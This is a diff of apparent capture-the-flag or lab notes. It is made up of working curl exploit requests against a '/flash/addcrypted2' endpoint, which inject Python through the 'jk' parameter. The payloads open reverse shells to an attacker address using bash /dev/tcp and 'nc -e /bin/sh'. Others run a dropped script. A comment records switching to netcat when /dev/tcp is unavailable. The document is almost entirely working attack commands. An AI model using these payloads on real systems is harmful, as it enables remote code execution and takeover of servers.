@@ -105,11 +105,15 @@ Could not decrypt key
 
 
 curl -i -s -k -X $'POST' \
-    --data-binary $'jk=pyimport%20os;os.system(\"nc%2010.10.16.24%204444");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
+    --data-binary $'jk=%0Apyimport%20os%3Bos.system(%22.%2Ftmp%2Fscript.sh%22)%3Bf%3Dfunction%20f2()%7B%7D%3B%0Af=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
     $'http://127.0.0.1:9000/flash/addcrypted2'
 
 curl -i -s -k -X $'POST' \
-    --data-binary $'jk=pyimport%20os;os.system(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.24/9001 0>&1'");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
+    --data-binary $'jk=pyimport%20os;os.system(\"nc%2010.10.16.24%201234");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
+    $'http://127.0.0.1:9000/flash/addcrypted2'
+
+curl -i -s -k -X $'POST' \
+    --data-binary $'jk=pyimport%20os;os.system(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.24/1234 0>&1'");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
     $'http://127.0.0.1:9000/flash/addcrypted2'
 
 %2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.24%2F9001%200%3E%261%27%0A
@@ -126,4 +130,25 @@ curl -i -s -k -X $'POST' \
 
 curl -i -s -k -X $'POST' \
     --data-binary $'jk=pyimport%20os;os.system(\"%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.16.24%2F9001%200%3E%261%27%0A");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
+    $'http://127.0.0.1:9000/flash/addcrypted2'
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 184' \
+    --data-binary $'package=xxx&crypted=AAAA&jk=pyimport%20os%3Bos.system(%22.%2Ftmp%2Fscript.sh%22)%3Bf%3Dfunction%20f2()%7B%7D%3B;f=function%20f2(){};&passwords=aaaa' \
+    $'http://127.0.0.1:8000/flash/addcrypted2'
+
+
+pyimport os;os.system("./tmp/script.sh");f=function f2(){};
+
+pyimport os;os.system("nc 10.10.16.24 1234");
+pyimport%20os%3Bos.system(%22nc%2010.10.16.24%201234%22)%3B
+
+# trying netcat as /dev/tcp doesnot exists
+
+nc -e /bin/sh 10.10.16.24 1234
+pyimport%20os;os.system("nc%20-e%20/bin/sh%2010.10.16.24%201234");
+pyimport%20os%3Bos.system(%22nc%20-e%20%2Fbin%2Fsh%2010.10.16.24%201234%22)%3B%0A
+
+curl -i -s -k -X $'POST' \
+    --data-binary $'jk=pyimport%20os;os.system("nc%20-e%20/bin/sh%2010.10.16.24%201234");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
     $'http://127.0.0.1:9000/flash/addcrypted2'
